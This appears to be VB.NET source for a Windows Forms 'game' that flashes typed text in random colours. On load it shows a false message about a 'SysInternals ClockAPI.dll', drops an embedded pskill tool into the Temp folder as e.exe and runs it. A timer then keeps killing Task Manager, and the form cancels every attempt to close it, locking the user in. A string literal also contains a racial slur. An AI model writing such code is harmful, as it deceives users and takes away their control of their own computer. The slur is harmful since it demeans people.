Public Class Form1
    Dim XPos = 0
    Dim YPos = 0
    Dim WhereWeAt = 0
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.BackColor = Color.White
        MsgBox("Note: This program uses SysInternals ClockAPI.dll to enchance Timer speed. Please accept agreement.")
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\e.exe", My.Resources.pskill)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\e.exe")
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Label1.Location = New Point(CInt(Math.Ceiling(Rnd() * 400)) + 1, CInt(Math.Ceiling(Rnd() * 400)) + 1)
        WhereWeAt = CInt(Math.Ceiling(Rnd() * 10)) + 1
        If WhereWeAt = 1 Then
            Label1.ForeColor = Color.Blue
        End If
        If WhereWeAt = 2 Then
            Label1.ForeColor = Color.Red
        End If
        If WhereWeAt = 3 Then
            Label1.ForeColor = Color.Green
        End If
        If WhereWeAt = 4 Then
            Label1.ForeColor = Color.Yellow
        End If
        If WhereWeAt = 5 Then
            Label1.ForeColor = Color.Brown
        End If
        If WhereWeAt = 5 Then
            Label1.ForeColor = Color.Purple
        End If
        If WhereWeAt = 6 Then
            Label1.ForeColor = Color.Pink
        End If
        If WhereWeAt = 7 Then
            Label1.ForeColor = Color.Black
            Me.BackColor = Color.Orange
        End If
        If WhereWeAt = 8 Then
            Label1.ForeColor = Color.Orange
            '      If Label1.Text.ToString() = Not "" Then
            Me.BackColor = Color.Purple
            'End If
        End If
        If WhereWeAt = 9 Then
            Label1.ForeColor = Color.Cyan
            '  If Label1.Text.ToString() = Not "" Then
            Me.BackColor = Color.Blue
            ' End If
        End If
        If WhereWeAt = 10 Then
            Label1.ForeColor = Color.White
            'If Label1.Text.ToString() = Not "" Then
            Me.BackColor = Color.Black
            'End If
        End If
    End Sub

    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged
        Timer1.Enabled = True
        Label1.Text = TextBox1.Text
        Me.Text = TextBox1.Text
        If TextBox1.Text = "" Then
            Timer1.Enabled = False
            Me.BackColor = Color.White
        End If
        If TextBox1.Text = "hello nigg" Then
            YPos = 1
            TextBox1.MaxLength = 11
        End If
        If TextBox1.Text.ToString = "yes" Then
            TextBox1.Text = "You win!"
            Label1.Visible = True
            Label2.Visible = True
            Label2.Text = "Game Over."
            Label1.Text = "You Win!"
            Timer1.Enabled = True
            Me.BackColor = Color.White
            YPos = 0
            TextBox1.Enabled = False
            Me.Text = "WINNER WINNER WINNER WINNER"
            Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
            Dim UnloadMode As System.Windows.Forms.CloseReason = CloseReason.MdiFormClosing
            If UnloadMode = CloseReason.UserClosing Then
                'Prevent it closing

            End If
        End If
        If TextBox1.Text = "more" Then
            Button1.Visible = True
        End If
    End Sub
    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True

    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp + "\e.exe", "-t taskmgr.exe > nul")
        '  ")
    End Sub

    Private Sub NumericUpDown1_ValueChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NumericUpDown1.ValueChanged
        If NumericUpDown1.Value = 0 Then
            Label2.Text = "no"
            Label2.Visible = True
            NumericUpDown1.Value = 69
        End If
        Timer1.Interval = NumericUpDown1.Value
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Label3.Visible = True
        Label3.Text = XPos.ToString
        XPos = XPos + 1
        If XPos = 12 Then
            TextBox1.MaxLength = 50
        End If
    End Sub
End Class
